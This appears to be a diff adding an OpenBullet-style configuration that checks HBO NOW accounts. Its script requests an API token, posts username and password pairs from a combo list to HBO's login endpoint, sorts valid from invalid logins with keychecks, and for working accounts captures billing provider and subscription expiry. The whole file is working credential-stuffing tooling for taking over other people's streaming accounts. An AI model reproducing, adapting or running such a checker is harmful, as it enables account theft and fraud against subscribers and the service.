@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "HBO NOW",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-12T10:59:39.6161824+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_RANDOM FUNCTION RandomNum 0 9999 -> VAR "RANDOM" 
+
+#GET_TOKEN REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"client_id\":\"7e278f74-d580-4292-b3a9-f7a023e5ca03\",\"client_secret\":\"7e278f74-d580-4292-b3a9-f7a023e5ca03\",\"scope\":\"browse video_playback_free account_registration\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"b1c15492-7d2b-4457-bf91-e018e<RANDOM>bd7\",\"clientDeviceData\":{\"paymentProviderCode\":\"apple\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: HBO%20NOW/21.0.0.161 CFNetwork/897.15 Darwin/17.5.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "X-Hbo-Client-Version: Hadron/21.0.0.161 ios (IPHONE/12.0.1)" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN" 
+
+#LOGIN REQUEST POST "https://comet.api.hbo.com/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: HBO%20NOW/21.0.0.161 CFNetwork/897.15 Darwin/17.5.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "X-Hbo-Client-Version: Hadron/21.0.0.161 ios (IPHONE/12.0.1)" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "access_token" 
+    KEY "eyJ" 
+    KEY "<RESPONSECODE>" Contains "200" 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+#GET_TOKEN_1 PARSE "<SOURCE>" JSON "access_token" -> VAR "TOKEN1" 
+
+#GET_CAPTURE REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: HBO%20NOW/21.0.0.161 CFNetwork/897.15 Darwin/17.5.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "Host: comet.api.hbo.com" 
+  HEADER "X-Hbo-Client-Version: Hadron/21.0.0.161 ios (IPHONE/12.0.1)" 
+  HEADER "Authorization: Bearer <TOKEN1>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO NOW" 
+
+PARSE "<SOURCE>" LR "Your HBO NOW subscription is billed through [" "](strong" -> CAP "Billed Through" 
+
+PARSE "<SOURCE>" LR "nYour subscription is paid through [" "](strongDate). " -> CAP "Expire Date" 
+
